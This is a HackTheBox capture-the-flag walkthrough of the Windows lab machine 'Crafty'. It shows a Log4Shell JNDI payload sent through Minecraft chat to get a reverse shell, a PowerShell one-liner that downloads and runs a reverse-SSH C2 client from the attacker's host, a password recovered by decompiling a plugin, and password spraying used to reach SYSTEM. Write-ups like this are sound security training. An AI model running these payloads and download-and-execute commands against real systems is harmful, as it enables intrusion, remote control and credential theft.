---
render_with_liquid: false
title: HackTheBox Writeup  Crafty
date: 2024-02-11 15:49:24 +1400
tags: [hackthebox, nmap, windows, feroxbuster, gobuster, minecraft-server, minecraft, pycraft, log4shell, log4j, reverse-ssh, discover-secrets, java, jadx-gui, decompilation, reversing, port-forwarding, netexec, password-spraying, forensics]
---



Crafty is an easy-difficulty Windows machine featuring the exploitation of a `Minecraft` server. Enumerating the version of the server reveals that it is vulnerable to pre-authentication Remote Code Execution (RCE), by abusing `Log4j Injection`. After obtaining a reverse shell on the target, enumerating the filesystem reveals that the administrator composed a Java-based `Minecraft` plugin, which when reverse engineered reveals `rcon` credentials. Those credentials are leveraged with the `RunAs` utility to gain Administrative access, compromising the system.


# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Crafty]
└─$ pt init '10.10.11.249 crafty.htb play.crafty.htb'
+---------+--------+--------------+-----------------+
| PROFILE | STATUS |      IP      |     DOMAIN      |
+---------+--------+--------------+-----------------+
| crafty  | on     | 10.10.11.249 | crafty.htb      |
| crafty  | on     | 10.10.11.249 | play.crafty.htb |
+---------+--------+--------------+-----------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Sun Feb 11 15:49:24 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 80,25565, crafty.htb
Nmap scan report for crafty.htb (10.10.11.249)
Host is up, received user-set (0.087s latency).
Scanned at 2024-02-11 15:49:24 CST for 12s

PORT      STATE SERVICE   REASON          VERSION
80/tcp    open  http      syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Crafty - Official Website
25565/tcp open  minecraft syn-ack ttl 127 Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Feb 11 15:49:36 2024 -- 1 IP address (1 host up) scanned in 12.22 seconds
```

## 80 - HTTP : 


### Info

```ruby
http://crafty.htb [200] [Crafty - Official Website] [Microsoft-IIS/10.0] [IIS:10.0,Windows Server] [a953408224818d3373568895f5a3898686b4d9e4]
```

- vhost : `play.crafty.htb`

![](/assets/obsidian/cf8bf6dfdd2db608e297f69fee9da1bf.png)

### Directory

```bash
feroxbuster -w /usr/share/dirb/wordlists/big.txt -t 100 -o ferox_80_big.txt -u http://$(pt get rhost)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Crafty]
└─$ cat ferox_80_big.txt| awk '$1!=404'
200      GET        1l       12w     2799c http://crafty.htb/js/firefly.js
200      GET       35l       98w     1206c http://crafty.htb/coming-soon
200      GET       77l      234w     2159c http://crafty.htb/js/main.js
200      GET      224l      434w     3585c http://crafty.htb/css/stylesheet.css
200      GET      102l      488w    43575c http://crafty.htb/img/logo.png
200      GET      105l      560w    43365c http://crafty.htb/img/vote.png
200      GET      131l      814w    68917c http://crafty.htb/img/forums.png
200      GET      204l     1117w    83278c http://crafty.htb/img/store.png
200      GET       43l      330w   179869c http://crafty.htb/img/favicon.ico
200      GET       58l      150w     1826c http://crafty.htb/
403      GET       29l       92w     1233c http://crafty.htb/img/
403      GET       29l       92w     1233c http://crafty.htb/js/
403      GET       29l       92w     1233c http://crafty.htb/css/
200      GET       58l      150w     1826c http://crafty.htb/Home
200      GET      173l     1379w    80723c http://crafty.htb/img/coming-soon.png
301      GET        2l       10w      145c http://crafty.htb/css => http://crafty.htb/css/
200      GET       58l      150w     1826c http://crafty.htb/home
301      GET        2l       10w      145c http://crafty.htb/img => http://crafty.htb/img/
301      GET        2l       10w      144c http://crafty.htb/js => http://crafty.htb/js/
```

### Subdomains

```bash
┌──(bravosec㉿fsociety)-[~/htb/Crafty]
└─$ gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -k -t 100 -u http://$(pt get rhost)
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://crafty.htb
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: xn--nckxa3g7cq2b5304djmxc-biz.crafty.htb Status: 400 [Size: 334]
[...]
Progress: 114441 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

# User Flag
---

## Shell as svc_minecraft

### Minecraft 1.16.5 - Log4shell


#### Info

- Google : `Minecraft 1.16.5 exploit` will result `Log4shell`, 
- It's a common CVE to abuse **JNDI** (Java Naming and Directory Interface) on **Apache Log4** that can download a JAVA file then execute it

#### Connect to minecraft server


##### CLI

Use minecraft python client

```bash
git clone https://github.com/ammaraskar/pyCraft
cd pyCraft
pipenv shell
pip install -r requirements.txt
```

I can send messages and view events

```bash
┌──(pyCraft-RWffmEyJ)─(bravosec㉿fsociety)-[~/htb/Crafty/exploit/pyCraft]
└─$ python start.py -s $(pt get rhost) -o -u x
Connecting in offline mode...
Connected.
a
Message (CHAT): {"translate":"chat.type.text","with":[{"insertion":"x","clickEvent":{"action":"suggest_command","value":"/tell x "},"hoverEvent":{"action":"show_entity","contents":{"type":"minecraft:player","id":"b838e741-2ef2-3b7b-9558-e90200080d08","name":{"text":"x"}}},"text":"x"},"a"]}
Message (CHAT): {"translate":"chat.type.text","with":[{"insertion":"Elus1nist","clickEvent":{"action":"suggest_command","value":"/tell Elus1nist "},"hoverEvent":{"action":"show_entity","contents":{"type":"minecraft:player","id":"d9c1b91b-8ae3-362a-b017-20697bdcc5d0","name":{"text":"Elus1nist"}}},"text":"Elus1nist"},"hey!"]}
www
Message (CHAT): {"translate":"chat.type.text","with":[{"insertion":"x","clickEvent":{"action":"suggest_command","value":"/tell x "},"hoverEvent":{"action":"show_entity","contents":{"type":"minecraft:player","id":"b838e741-2ef2-3b7b-9558-e90200080d08","name":{"text":"x"}}},"text":"x"},"www"]}
```

##### GUI

I can also use GUI client on my windows host machine in order to join and play with other players : P

Port forward minecraft server port `25565` to my VM on `0.0.0.0`

```bash
socat tcp-listen:25565,fork,reuseaddr tcp:10.10.11.249:25565
```

Then port forward the port to my host with Virtualbox NAT network manager

![](/assets/obsidian/dd3b1125fed9f5d11a39a33a9bfbd2c0.png)

![](/assets/obsidian/039e336ab62e210a69549aa57e1b5048.png)

Open **lunar client** (Or use **SKLauncher** for free) and select version `1.16.5`

![](/assets/obsidian/c271ed0389e80ff6ca02883c16ac2862.png)

![](/assets/obsidian/5907ac584725e24889fe0e91be3260f0.png)

#### Exploit

> https://github.com/kozmer/log4j-shell-poc

```bash
git clone https://github.com/kozmer/log4j-shell-poc
cd log4j-shell-poc
```

Download the java binary as described in POC documentation (Requires oracle account)

> https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html

```bash
tar -xf jdk-8u202-linux-x64.tar.gz
```

I had to modify the POC

```bash
┌──(bravosec㉿fsociety)-[~/htb/Crafty/exploit/log4j-shell-poc_original]
└─$ diff poc.py ../log4j-shell-poc/poc.py
26c26
<         String cmd="/bin/sh";
---
>         String cmd="cmd.exe";
62c62
<         subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
---
>         subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_202/bin/javac"), str(p)])
87c87
<         os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
---
>         os.path.join(CUR_FOLDER, 'jdk1.8.0_202/bin/java'),
99c99
<         os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
---
>         os.path.join(CUR_FOLDER, "jdk1.8.0_202/bin/java"),
```

Run poc to start ldap and web server to host payload

```bash
┌──(bravosec㉿fsociety)-[~/htb/Crafty/exploit/log4j-shell-poc]
└─$ python poc.py --userip $(pt get lhost) --lport 1111

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.10.14.48:1389/a}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Listening on 0.0.0.0:1389
```

Send the payload to chat

```bash
┌──(pyCraft-RWffmEyJ)─(bravosec㉿fsociety)-[~/htb/Crafty/exploit/pyCraft]
└─$ rlwrap python start.py -u x -o -s $(pt get rhost)
Connecting in offline mode...
Connected.
${jndi:ldap://10.10.14.83:1389/a}
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Crafty/exploit/log4j-shell-poc]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.83] from (UNKNOWN) [10.129.199.86] 49681
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\users\svc_minecraft\server>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\users\svc_minecraft\server> whoami
whoami
crafty\svc_minecraft
PS C:\users\svc_minecraft\server> cat C:\users\svc_minecraft\Desktop\user.txt
917ec1de07337cf54614b4b94439d57f
```

# Root Flag
---

## From svc_minecraft to Administrator


### Reverse SSH - Interactive shell

> https://github.com/NHAS/reverse_ssh

Start server

```bash
┌──(bravosec㉿fsociety)-[~/htb/Crafty]
└─$ cd /opt/sectools/c2/reverse_ssh/bin && ./server 0.0.0.0:443
2024/01/18 23:19:14 Loading files from /opt/sectools/c2/reverse_ssh/bin
2024/01/18 23:19:14 Version:  v2.4.1
2024/01/18 23:19:14 Listening on 0.0.0.0:443
2024/01/18 23:19:14 Loading private key from: /opt/sectools/c2/reverse_ssh/bin/id_ed25519
2024/01/18 23:19:14 Server key fingerprint:  fe76708014a97adea5673c27edf4800c7ec45dc51f90612dfb08593b0ebcd2e2
2024/01/18 23:19:14 Loading authorized keys from: /opt/sectools/c2/reverse_ssh/bin/authorized_keys
2024/01/18 23:19:14 Was unable to read webhooks configuration file
```

Build the client

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh]
└─$ RSSH_HOMESERVER=10.10.14.83:443 make
```

Download and start the client

```bash
PS C:\users\svc_minecraft\server> (new-object System.Net.WebClient).DownloadFile('http://10.10.14.83/win/client.exe', '\programdata\client.exe'); \programdata\client.exe
```

Connect to the client, now I have **ssh**'s functionalities

```bash
┌──(bravosec㉿fsociety)-[~/htb/Crafty]
└─$ ssh 127.0.0.1 -p 443 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 7d814d0da41a2113e06d752e903e6097fa73749c | SSH-v2.4.1-windows_amd64 |
| 4560e76350de6d8c31090d0eabcd9a9da8c8c58b |                          |
| crafty.svc_minecraft.crafty              |                          |
| 10.129.166.189:49728                     |                          |
+------------------------------------------+--------------------------+

┌──(bravosec㉿fsociety)-[~/htb/Crafty]
└─$ ssh -J 127.0.0.1:443 crafty.svc_minecraft.crafty
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\users\svc_minecraft\server>
```

### Enumeration

- Ran **winpeas** and nothing interesting found

```bash
PS C:\users\svc_minecraft\server> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ==============================================
crafty\svc_minecraft S-1-5-21-4088429403-1159899800-2753317549-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```bash
PS C:\users\svc_minecraft> Get-LocalGroup | foreach {$groupName = $_.name;Get-LocalGroupMember $groupName | select *,@{n="GroupName";e={$groupName}}} | ft -group GroupName


   GroupName: Administrators

Name                 SID                                           PrincipalSource ObjectClass GroupName
----                 ---                                           --------------- ----------- ---------
CRAFTY\Administrator S-1-5-21-4088429403-1159899800-2753317549-500           Local User        Administrators


   GroupName: Guests

Name         SID                                           PrincipalSource ObjectClass GroupName
----         ---                                           --------------- ----------- ---------
CRAFTY\Guest S-1-5-21-4088429403-1159899800-2753317549-501           Local User        Guests


   GroupName: Remote Management Users

Name                 SID                                            PrincipalSource ObjectClass GroupName
----                 ---                                            --------------- ----------- ---------
CRAFTY\Administrator S-1-5-21-4088429403-1159899800-2753317549-500            Local User        Remote Management Users
CRAFTY\jacob         S-1-5-21-4088429403-1159899800-2753317549-1001           Local User        Remote Management Users


   GroupName: System Managed Accounts Group

Name                  SID                                           PrincipalSource ObjectClass GroupName
----                  ---                                           --------------- ----------- ---------
CRAFTY\DefaultAccount S-1-5-21-4088429403-1159899800-2753317549-503           Local User        System Managed Accounts Group


   GroupName: Users

Name                             SID                                            PrincipalSource ObjectClass GroupName
----                             ---                                            --------------- ----------- ---------
CRAFTY\jacob                     S-1-5-21-4088429403-1159899800-2753317549-1001           Local User        Users
CRAFTY\svc_minecraft             S-1-5-21-4088429403-1159899800-2753317549-1002           Local User        Users
NT AUTHORITY\Authenticated Users S-1-5-11                                               Unknown Group       Users
NT AUTHORITY\INTERACTIVE         S-1-5-4                                                Unknown Group       Users
```

- Checked the data in `logs` folder, nothing interesting
- Checked `server.properties`, nothing interesting

```bash
PS C:\users\svc_minecraft\server> ls -Force | sort LastWriteTime


    Directory: C:\users\svc_minecraft\server


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/24/2023   1:43 PM       37962360 server.jar
-a----       10/24/2023   1:48 PM            183 eula.txt
-a----       10/24/2023   1:51 PM              2 whitelist.json
d-----       10/27/2023   2:48 PM                plugins
-a----       11/14/2023  10:00 PM           1130 server.properties
-a----       11/14/2023  10:00 PM              2 banned-players.json
-a----       11/14/2023  10:00 PM              2 banned-ips.json
-a----       11/14/2023  11:22 PM              2 ops.json
d-----        2/11/2024   4:06 PM                logs
d-----        2/11/2024  10:22 PM                world
-a----        2/11/2024  10:26 PM            100 usercache.json
```

### Password in plugin jar file

`playercounter-1.0-SNAPSHOT.jar` might be a custom plugin

```bash
PS C:\users\svc_minecraft\server> ls -Force plugins
ls -Force plugins


    Directory: C:\users\svc_minecraft\server\plugins


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/27/2023   2:48 PM           9996 playercounter-1.0-SNAPSHOT.jar
```

Transfer plugin file

```bash
scp -J 127.0.0.1:443 crafty.svc_minecraft.crafty:'C:\\users\\svc_minecraft\\server\\plugins\\playercounter-1.0-SNAPSHOT.jar' ./loot/playercounter-1.0-SNAPSHOT.jar
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Crafty]
└─$ 7z l loot/playercounter-1.0-SNAPSHOT.jar
[...]
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2023-10-27 06:32:44 D....            0            2  META-INF
2023-10-27 06:32:44 .....           81           81  META-INF/MANIFEST.MF
2023-10-27 06:32:40 .....          109           78  plugin.yml
2023-10-27 06:32:42 D....            0            2  htb
2023-10-27 06:32:42 D....            0            2  htb/crafty
2023-10-27 06:32:42 D....            0            2  htb/crafty/playercounter
2023-10-27 06:32:42 .....         1503          839  htb/crafty/playercounter/Playercounter.class
2023-10-27 06:31:46 D....            0            2  META-INF/maven
2023-10-27 06:31:46 D....            0            2  META-INF/maven/htb.crafty
2023-10-27 06:31:46 D....            0            2  META-INF/maven/htb.crafty/playercounter
2023-10-27 06:31:46 .....         2832          792  META-INF/maven/htb.crafty/playercounter/pom.xml
2023-10-27 06:32:42 .....           65           66  META-INF/maven/htb.crafty/playercounter/pom.properties
2021-02-25 08:55:08 D....            0            2  net
2021-02-25 08:55:08 D....            0            2  net/kronos
2021-02-25 08:55:08 D....            0            2  net/kronos/rkon
2021-02-25 08:55:08 D....            0            2  net/kronos/rkon/core
2021-02-25 08:55:08 .....         2939         1513  net/kronos/rkon/core/Rcon.class
2021-02-25 08:55:08 .....         3356         1713  net/kronos/rkon/core/RconPacket.class
2021-02-25 08:55:08 D....            0            2  net/kronos/rkon/core/ex
2021-02-25 08:55:08 .....          409          255  net/kronos/rkon/core/ex/AuthenticationException.class
2021-02-25 08:55:08 .....          412          264  net/kronos/rkon/core/ex/MalformedPacketException.class
2021-02-25 08:55:02 D....            0            2  META-INF/maven/net.kronos.rkon.core
2021-02-25 08:55:02 D....            0            2  META-INF/maven/net.kronos.rkon.core/rkon-core
2021-02-25 08:55:02 .....         1527          431  META-INF/maven/net.kronos.rkon.core/rkon-core/pom.xml
2021-02-25 08:55:10 .....          112          104  META-INF/maven/net.kronos.rkon.core/rkon-core/pom.properties
------------------- ----- ------------ ------------  ------------------------
2023-10-27 06:32:44              13345         6164  11 files, 14 folders
```

No interesting string found, but knowing that it involves authentication keeps me motivated

```bash
┌──(bravosec㉿fsociety)-[~/htb/Crafty]
└─$ 7z x loot/playercounter-1.0-SNAPSHOT.jar -o'loot/playercounter'

┌──(bravosec㉿fsociety)-[~/htb/Crafty]
└─$ cd loot/playercounter

┌──(bravosec㉿fsociety)-[~/htb/Crafty/loot/playercounter]
└─$ grep -rina pass
net/kronos/rkon/core/Rcon.class:18:vwsyncLjava/lang/Object;randLjava/util/Random;       requestIdIsocketLjava/net/Socket;charsetLjava/nio/charset/Charset;<init>(Ljava/lang/String;I[B)VCodeLineNumberTableLocalVariableTablethisnet/kronos/rkon/core/Rcon;hostLjava/lang/String;porpassword[B
net/kronos/rkon/core/Rcon.class:23:SourceFile   Rcon.java
[...]
```

Decompile it with kali's bult-in **jadx** java decompiler, found a password string

![](/assets/obsidian/af28bb886db89b72f215ae32e5b14607.png)

> Decompile with CLI
> ```bash
> java -jar /opt/sectools/re/decompile/jd-cli-1.2.1.jar playercounter-1.0-SNAPSHOT.jar -od decompiled
> ```
{: .prompt-tip }

### Password spray with port forwarding

Port forward SMB port

```bash
ssh -J 127.0.0.1:443 crafty.svc_minecraft.crafty -L 445:127.0.0.1:445
```

Get a list of enabled users

```bash
PS C:\users\svc_minecraft\server> Get-LocalUser | ? Enabled | select Name

Name
----
Administrator
jacob
svc_minecraft
```

The password is valid for Administrator

```bash
┌──(bravosec㉿fsociety)-[~/htb/Crafty]
└─$ nxc smb 127.0.0.1 -u loot/users.lst -p 's67u84zKq8IXw' --continue-on-success
SMB         127.0.0.1       445    CRAFTY           [*] Windows 10.0 Build 17763 x64 (name:CRAFTY) (domain:crafty) (signing:False) (SMBv1:False)
SMB         127.0.0.1       445    CRAFTY           [+] crafty\Administrator:s67u84zKq8IXw (Pwn3d!)
SMB         127.0.0.1       445    CRAFTY           [-] crafty\jacob:s67u84zKq8IXw STATUS_LOGON_FAILURE
SMB         127.0.0.1       445    CRAFTY           [-] crafty\svc_minecraft:s67u84zKq8IXw STATUS_LOGON_FAILURE
```

Start reverse ssh client (It will use `atexec` method since smb ports were not fully forwarded, so I will get a session as `nt authority\system`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Crafty]
└─$ nxc smb 127.0.0.1 -u administrator -p 's67u84zKq8IXw' -x '\programdata\client.exe'
SMB         127.0.0.1       445    CRAFTY           [*] Windows 10.0 Build 17763 x64 (name:CRAFTY) (domain:crafty) (signing:False) (SMBv1:False)
SMB         127.0.0.1       445    CRAFTY           [+] crafty\administrator:s67u84zKq8IXw (Pwn3d!)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Crafty]
└─$ ssh 127.0.0.1 -p 443 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 4392a41c8abbca593b0a509391ae4fdfd903dad6 | SSH-v2.4.1-windows_amd64 |
| 4560e76350de6d8c31090d0eabcd9a9da8c8c58b |                          |
| nt.authority.system.crafty               |                          |
| 10.129.166.189:49768                     |                          |
+------------------------------------------+--------------------------+
| 7d814d0da41a2113e06d752e903e6097fa73749c | SSH-v2.4.1-windows_amd64 |
| 4560e76350de6d8c31090d0eabcd9a9da8c8c58b |                          |
| crafty.svc_minecraft.crafty              |                          |
| 10.129.166.189:49728                     |                          |
+------------------------------------------+--------------------------+

┌──(bravosec㉿fsociety)-[~/htb/Crafty]
└─$ ssh -J 127.0.0.1:443 nt.authority.system.crafty
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> cat C:\Users\Administrator\Desktop\root.txt
f690dada041c9f7a791ce978b5131675
PS C:\Windows\system32>
```

# Additional
---

## Windows Forensics - User Recent Files and Shellbags

Forensics can be extremely useful during penetration testing, some UNC path, File / Folder Path, activities that could be interesting will be revealed

I will use **shellbagsview** (Dump MRU) and **recentfilesview** (Dump recent files/folders from registry and user recent folder) from **nirsoft**, these are the few tools that doesn't require administrative rights to view user activities

```bash
(new-object System.Net.WebClient).DownloadFile('http://10.10.14.83/shellbagsview.exe', '\programdata\shellbagsview.exe')
(new-object System.Net.WebClient).DownloadFile('http://10.10.14.83/recentfilesview.exe', '\programdata\recentfilesview.exe')
```

```bash
\programdata\RecentFilesView.exe /stab "C:\windows\temp\recent.txt" /sort "Execute Time"
\programdata\ShellBagsView.exe /stab "C:\windows\temp\shellbags.txt" /sort "Slot Modified Time"
```

Download the results to kali

```bash
scp -J 127.0.0.1:443 crafty.svc_minecraft.crafty:'\\windows\\temp\\recent.txt' ./recent.txt
scp -J 127.0.0.1:443 crafty.svc_minecraft.crafty:'\\windows\\temp\\shellbags.txt' ./shellbags.txt
```

The results have UTF-16 encodings, which is common for windows, convert them to utf-8

```bash
┌──(bravosec㉿fsociety)-[/tmp]
└─$ file recent.txt
recent.txt: Unicode text, UTF-16, little-endian text, with CRLF line terminators
```

```bash
iconv -f utf-16 -t utf-8 recent.txt -c -o recent.txt
iconv -f utf-16 -t utf-8 shellbags.txt -c -o shellbags.txt
```

From the result, I know `server.properties`, `ops.json`, and `plugins`, `logs` folder are interesting to investigate

```bash
┌──(bravosec㉿fsociety)-[/tmp]
└─$ cat recent.txt | awk -F '\t' '{print $4"|"$1}' | column -s '|' -t
10/24/2023 11:39:11 AM  C:\Users
10/24/2023 11:39:11 AM  C:\Users\svc_minecraft
11/14/2023 3:25:31 AM   C:\Users\svc_minecraft\server\server.properties
11/14/2023 10:31:13 PM  C:\Users\svc_minecraft\server\ops.json
11/14/2023 10:31:13 PM  C:\Users\svc_minecraft\server

┌──(bravosec㉿fsociety)-[/tmp]
└─$ cat shellbags.txt | awk -F '\t' '{print $10$11"|"$1}' | column -s '|' -t
10/24/2023 11:39:03 AM  C:\
10/24/2023 11:39:04 AM  C:\Users
10/24/2023 11:39:08 AM  C:\Users\svc_minecraft\New folder
10/24/2023 11:39:13 AM  C:\Users\svc_minecraft
10/24/2023 11:39:23 AM  C:\Users\svc_minecraft\server
11/14/2023 10:33:34 PM  C:\Users\svc_minecraft\server\plugins
11/14/2023 10:33:43 PM  C:\Users\svc_minecraft\server\logs
```


## Minecraft hacked client

> Cheating is not allowed in online servers, do this only in offline mode with friends

- There's plenty on github

